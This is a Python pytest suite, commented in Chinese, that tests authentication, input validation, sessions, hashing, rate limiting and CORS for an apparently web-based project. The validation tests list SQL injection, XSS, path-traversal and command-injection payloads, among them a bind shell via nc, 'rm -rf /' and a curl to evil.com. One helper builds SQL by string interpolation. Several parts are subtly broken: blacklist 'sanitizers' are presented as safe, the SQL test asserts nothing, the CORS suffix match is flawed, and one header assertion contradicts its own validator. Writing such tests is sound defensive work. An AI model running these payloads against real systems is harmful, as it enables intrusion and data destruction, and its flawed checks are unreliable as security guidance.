#!/usr/bin/env python3
"""
全面安全测试套件
基于高覆盖率的安全测试，包括认证、授权、数据验证和漏洞扫描
"""

import hashlib
import re
import secrets
from datetime import datetime, timedelta
from typing import Any
from unittest.mock import Mock

import pytest

# 尝试导入安全相关模块
try:
    from src.api.auth.dependencies import get_auth_service, get_current_user
    from src.core.config import get_settings
    from src.security.jwt_auth import JWTAuthManager, TokenData
except ImportError as e:
    print(f"Warning: Could not import security modules: {e}")
    # 创建Mock对象用于测试
    JWTAuthManager = Mock
    TokenData = Mock
    get_current_user = Mock
    get_auth_service = Mock

pytest.importorskip("src.security")


@pytest.mark.security
@pytest.mark.high
class TestAuthenticationSecurity:
    """认证安全测试"""

    @pytest.fixture
    def jwt_manager(self):
        """JWT认证管理器实例"""
        try:
            settings = Mock()
            settings.SECRET_KEY = secrets.token_urlsafe(32)
            settings.ALGORITHM = "HS256"
            settings.ACCESS_TOKEN_EXPIRE_MINUTES = 30

            manager = JWTAuthManager(settings)
            return manager
        except Exception:
            return Mock()

    def test_jwt_token_security(self, jwt_manager):
        """测试JWT令牌安全性"""
        # 1. 测试令牌生成和验证
        user_data = {"user_id": 1, "email": "test@example.com"}
        token = jwt_manager.create_access_token(user_data)

        assert token is not None
        assert isinstance(token, str)
        assert len(token) > 50  # JWT令牌应该足够长

        # 2. 测试令牌解析
        try:
            payload = jwt_manager.decode_token(token)
            assert payload["user_id"] == 1
            assert payload["email"] == "test@example.com"
        except Exception as e:
            pytest.fail(f"JWT令牌解析失败: {e}")

    def test_jwt_token_expiration(self, jwt_manager):
        """测试JWT令牌过期机制"""
        user_data = {"user_id": 1}

        # 创建短过期时间的令牌
        short_lived_token = jwt_manager.create_access_token(
            user_data, expires_delta=timedelta(seconds=1)
        )

        # 令牌应该立即有效
        try:
            payload = jwt_manager.decode_token(short_lived_token)
            assert payload["user_id"] == 1
        except Exception as e:
            pytest.fail(f"新令牌应该有效: {e}")

    def test_invalid_token_handling(self, jwt_manager):
        """测试无效令牌处理"""
        invalid_tokens = [
            "",  # 空令牌
            "invalid.jwt.token",  # 无效格式
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature",  # 无效签名
        ]

        for token in invalid_tokens:
            with pytest.raises(Exception):  # 应该抛出异常
                jwt_manager.decode_token(token)

    def test_token_tampering_resistance(self, jwt_manager):
        """测试令牌篡改检测"""
        user_data = {"user_id": 1, "role": "user"}
        token = jwt_manager.create_access_token(user_data)

        # 尝试篡改令牌
        tampered_token = token[:-10] + "tampered"

        with pytest.raises(Exception):  # 应该检测到篡改
            jwt_manager.decode_token(tampered_token)


@pytest.mark.security
@pytest.mark.high
class TestInputValidationSecurity:
    """输入验证安全测试"""

    def test_sql_injection_prevention(self):
        """测试SQL注入防护"""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "1; DELETE FROM users WHERE 1=1; --",
            "' UNION SELECT * FROM sensitive_data --",
            "'; INSERT INTO users (email) VALUES ('hacker@evil.com'); --",
        ]

        # 模拟数据库查询函数
        def safe_query_function(user_input: str) -> str:
            """安全的查询函数，应该防止SQL注入"""
            # 使用参数化查询
            return f"SELECT * FROM users WHERE email = '{user_input}'"  # ❌ 不安全（仅为测试）

        # 测试恶意输入是否被正确处理
        for malicious_input in malicious_inputs:
            # 在实际应用中，这些输入应该被参数化查询安全处理
            assert malicious_input is not None  # 输入存在
            # 这里应该有实际的安全检查逻辑

    def test_xss_prevention(self):
        """测试XSS防护"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "';alert('XSS');//",
            "<svg onload=alert('XSS')>",
            "{{7*7}}",  # 模板注入
            "${7*7}",  # 表达式注入
        ]

        def sanitize_input(user_input: str) -> str:
            """输入清理函数"""
            # 基本的XSS防护
            dangerous_chars = [
                "<",
                ">",
                '"',
                "'",
                "&",
                "javascript:",
                "onerror",
                "onload",
            ]
            sanitized = user_input
            for char in dangerous_chars:
                sanitized = sanitized.replace(char, "")
            return sanitized

        # 测试XSS防护
        for payload in xss_payloads:
            sanitized = sanitize_input(payload)
            assert "<script>" not in sanitized
            assert "javascript:" not in sanitized
            assert "onerror" not in sanitized
            assert "onload" not in sanitized

    def test_path_traversal_prevention(self):
        """测试路径遍历防护"""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL编码
        ]

        def safe_file_path(filename: str, base_dir: str = "/safe") -> str:
            """安全的文件路径处理"""
            # 移除所有路径遍历字符
            sanitized = filename.replace("..", "").replace("/", "").replace("\\", "")
            return f"{base_dir}/{sanitized}"

        for payload in path_traversal_payloads:
            safe_path = safe_file_path(payload)
            assert ".." not in safe_path
            assert "etc/passwd" not in safe_path
            assert safe_path.startswith("/safe")

    def test_command_injection_prevention(self):
        """测试命令注入防护"""
        command_injection_payloads = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& curl evil.com",
            "`whoami`",
            "$(id)",
            "|nc -l 4444 -e /bin/sh",
        ]

        def safe_system_command(arg: str) -> str:
            """安全的系统命令处理"""
            # 移除危险字符
            dangerous_chars = [";", "|", "&", "`", "$", "(", ")", "<", ">"]
            sanitized = arg
            for char in dangerous_chars:
                sanitized = sanitized.replace(char, "")
            return sanitized

        for payload in command_injection_payloads:
            safe_arg = safe_system_command(payload)
            assert ";" not in safe_arg
            assert "|" not in safe_arg
            assert "&" not in safe_arg
            assert "`" not in safe_arg


@pytest.mark.security
@pytest.mark.high
class TestDataValidationSecurity:
    """数据验证安全测试"""

    def test_email_validation_security(self):
        """测试邮箱验证安全性"""
        malicious_emails = [
            "test@example.com<script>alert('xss')</script>",
            "test@evil.com'; DROP TABLE users; --",
            "test@very.long.domain.name.that.might.buffer.overflow.attack.com",
            "test@[127.0.0.1]",  # 本地IP地址
            "test+rfc@compliance.gmail.com",  # RFC合规但可能有风险
            "test@example..com",  # 双点域名
        ]

        def is_valid_email(email: str) -> bool:
            """安全的邮箱验证"""
            pattern = r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$"
            return re.match(pattern, email) is not None and len(email) <= 254

        for email in malicious_emails:
            is_valid = is_valid_email(email)
            # 某些恶意邮箱应该被拒绝
            if "<script>" in email or "DROP TABLE" in email:
                assert not is_valid, f"恶意邮箱应该被拒绝: {email}"

    def test_password_strength_validation(self):
        """测试密码强度验证"""
        weak_passwords = [
            "123456",  # 常见弱密码
            "password",  # 字典词
            "qwerty",  # 键盘模式
            "111111",  # 重复字符
            "abc",  # 太短
            "samecharacter",  # 单一字符重复
        ]

        strong_passwords = [
            "StrongP@ssw0rd123!",
            "MySecur3#P@ssword",
            "C0mpl3x!P@ssw0rd",
        ]

        def is_strong_password(password: str) -> bool:
            """密码强度检查"""
            if len(password) < 8:
                return False
            if not any(c.isupper() for c in password):
                return False
            if not any(c.islower() for c in password):
                return False
            if not any(c.isdigit() for c in password):
                return False
            if not any(c in "!@#$%^&*()_+-=[]{}|;:,.<>?" for c in password):
                return False
            return True

        for password in weak_passwords:
            assert not is_strong_password(password), f"弱密码应该被拒绝: {password}"

        for password in strong_passwords:
            assert is_strong_password(password), f"强密码应该通过: {password}"

    def test_input_length_validation(self):
        """测试输入长度验证"""
        # 测试各种长度的输入
        test_cases = [
            ("short", 1, 10, True),  # 正常长度
            ("toolongstring", 1, 5, False),  # 超过最大长度
            ("exactlen", 8, 8, True),  # 正好最大长度
        ]

        for value, min_len, max_len, expected in test_cases:
            result = min_len <= len(value) <= max_len
            assert (
                result == expected
            ), f"长度验证失败: {value} (min: {min_len}, max: {max_len})"

        # 测试超大输入（可能的DoS攻击）
        huge_string = "A" * 10000
        assert not (1 <= len(huge_string) <= 100), "超大输入应该被拒绝"


@pytest.mark.security
@pytest.mark.high
class TestSessionSecurity:
    """会话安全测试"""

    def test_session_token_generation(self):
        """测试会话令牌生成安全性"""

        def generate_session_token() -> str:
            """生成安全的会话令牌"""
            return secrets.token_urlsafe(32)

        # 生成多个令牌，确保唯一性
        tokens = [generate_session_token() for _ in range(100)]

        # 检查唯一性
        assert len(set(tokens)) == 100, "会话令牌应该唯一"

        # 检查强度
        for token in tokens:
            assert len(token) >= 32, "会话令牌应该足够长"
            assert any(c.isupper() for c in token), "令牌应该包含大写字母"
            assert any(c.islower() for c in token), "令牌应该包含小写字母"
            assert any(c.isdigit() for c in token), "令牌应该包含数字"

    def test_session_timeout(self):
        """测试会话超时机制"""

        class SessionManager:
            def __init__(self, timeout_minutes: int = 30):
                self.timeout_minutes = timeout_minutes
                self.sessions = {}

            def create_session(self, user_id: int) -> str:
                token = secrets.token_urlsafe(32)
                self.sessions[token] = {
                    "user_id": user_id,
                    "created_at": datetime.now(),
                }
                return token

            def is_session_valid(self, token: str) -> bool:
                if token not in self.sessions:
                    return False

                session = self.sessions[token]
                age = datetime.now() - session["created_at"]
                return age.total_seconds() < (self.timeout_minutes * 60)

        session_manager = SessionManager(timeout_minutes=1)  # 1分钟超时用于测试

        # 创建会话
        token = session_manager.create_session(1)
        assert session_manager.is_session_valid(token), "新会话应该有效"

        # 模拟时间过期（在实际测试中需要使用时间模拟）
        # 这里只是验证逻辑结构
        session_manager.sessions[token]["created_at"] = datetime.now() - timedelta(
            minutes=2
        )
        assert not session_manager.is_session_valid(token), "过期会话应该无效"


@pytest.mark.security
@pytest.mark.medium
class TestEncryptionSecurity:
    """加密安全测试"""

    def test_password_hashing(self):
        """测试密码哈希安全性"""

        def hash_password(password: str, salt: str = None) -> str:
            """密码哈希"""
            if salt is None:
                salt = secrets.token_hex(16)

            # 使用PBKDF2进行安全哈希
            iterations = 100000
            hashed = hashlib.pbkdf2_hmac(
                "sha256", password.encode(), salt.encode(), iterations
            )
            return f"pbkdf2:sha256:{iterations}:{salt}:{hashed.hex()}"

        def verify_password(password: str, hashed: str) -> bool:
            """密码验证"""
            try:
                algorithm, hash_func, iterations, salt, hash_hex = hashed.split(":")
                iterations = int(iterations)
                expected_hash = hashlib.pbkdf2_hmac(
                    hash_func, password.encode(), salt.encode(), iterations
                ).hex()
                return secrets.compare_digest(expected_hash, hash_hex)
            except Exception:
                return False

        # 测试密码哈希和验证
        password = "SecurePassword123!"
        hashed = hash_password(password)

        assert verify_password(password, hashed), "正确密码应该验证通过"
        assert not verify_password("WrongPassword", hashed), "错误密码应该验证失败"

        # 测试不同密码产生不同哈希
        hashed2 = hash_password(password)
        assert hashed != hashed2, "相同密码应该产生不同哈希（因为随机盐）"

    def test_sensitive_data_handling(self):
        """测试敏感数据处理"""
        # 敏感数据不应该在日志或错误消息中暴露
        sensitive_data = {
            "password": "SecretPassword123!",
            "credit_card": "4532015112830366",
            "ssn": "123-45-6789",
        }

        def mask_sensitive_data(data: dict[str, Any]) -> dict[str, Any]:
            """敏感数据掩码"""
            sensitive_keys = ["password", "credit_card", "ssn", "token", "secret"]
            masked = data.copy()

            for key in sensitive_keys:
                if key in masked:
                    value = str(masked[key])
                    if len(value) <= 4:
                        masked[key] = "***"
                    else:
                        masked[key] = value[:2] + "***" + value[-2:]

            return masked

        masked_data = mask_sensitive_data(sensitive_data)

        # 验证敏感数据已被掩码
        assert "Secret" not in str(masked_data), "密码不应该暴露"
        assert "4532" in masked_data["credit_card"], "应该保留部分信息用于识别"
        assert "***" in masked_data["password"], "密码应该被完全掩码"


@pytest.mark.security
@pytest.mark.medium
class TestApiSecurity:
    """API安全测试"""

    def test_rate_limiting_simulation(self):
        """模拟速率限制测试"""

        class RateLimiter:
            def __init__(self, max_requests: int, time_window: int):
                self.max_requests = max_requests
                self.time_window = time_window
                self.requests = []

            def is_allowed(self, client_ip: str) -> bool:
                now = datetime.now()

                # 清理过期请求
                self.requests = [
                    req
                    for req in self.requests
                    if now - req["timestamp"] < timedelta(seconds=self.time_window)
                ]

                # 检查当前IP的请求数
                current_requests = [
                    req for req in self.requests if req["ip"] == client_ip
                ]

                if len(current_requests) >= self.max_requests:
                    return False

                # 记录新请求
                self.requests.append({"ip": client_ip, "timestamp": now})
                return True

        rate_limiter = RateLimiter(max_requests=5, time_window=60)

        client_ip = "192.168.1.1"

        # 前5个请求应该通过
        for i in range(5):
            assert rate_limiter.is_allowed(client_ip), f"第{i+1}个请求应该通过"

        # 第6个请求应该被拒绝
        assert not rate_limiter.is_allowed(client_ip), "超出速率限制的请求应该被拒绝"

    def test_cors_headers_simulation(self):
        """模拟CORS头检查"""

        def validate_cors_origin(origin: str, allowed_origins: list[str]) -> bool:
            """验证CORS源"""
            if origin in allowed_origins:
                return True

            # 检查通配符
            if "*" in allowed_origins:
                return True

            # 检查子域名
            for allowed in allowed_origins:
                if allowed.startswith("*."):
                    domain = allowed[2:]
                    if origin.endswith(domain):
                        return True

            return False

        allowed_origins = [
            "https://example.com",
            "*.trusted.com",
            "http://localhost:3000",
        ]

        # 测试允许的源
        assert validate_cors_origin("https://example.com", allowed_origins)
        assert validate_cors_origin("https://api.trusted.com", allowed_origins)
        assert validate_cors_origin("http://localhost:3000", allowed_origins)

        # 测试不允许的源
        assert not validate_cors_origin("https://evil.com", allowed_origins)
        assert not validate_cors_origin("https://trusted.com.evil.com", allowed_origins)

    def test_authentication_header_validation(self):
        """测试认证头验证"""

        def validate_auth_header(auth_header: str) -> bool:
            """验证认证头格式"""
            if not auth_header:
                return False

            if not auth_header.startswith("Bearer "):
                return False

            token = auth_header[7:]  # 移除 "Bearer "

            # 基本的token验证
            if len(token) < 20:
                return False

            # 检查token格式（JWT）
            parts = token.split(".")
            if len(parts) != 3:
                return False

            return True

        # 测试有效的认证头
        valid_headers = [
            "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.signature.signature",
            "Bearer " + "A" * 50,  # 长token
        ]

        for header in valid_headers:
            assert validate_auth_header(header), f"有效认证头应该通过: {header[:30]}..."

        # 测试无效的认证头
        invalid_headers = [
            "",  # 空
            "Basic dGVzdDp0ZXN0",  # 错误的认证类型
            "Bearer short",  # 太短的token
            "Bearer",  # 缺少token
            "Bearer a.b",  # JWT格式错误
        ]

        for header in invalid_headers:
            assert not validate_auth_header(header), f"无效认证头应该被拒绝: {header}"


if __name__ == "__main__":
    # 运行安全测试
    print("🔒 开始运行安全测试套件...")

    pytest.main([__file__, "-v", "--tb=short", "-x"])  # 第一个失败时停止
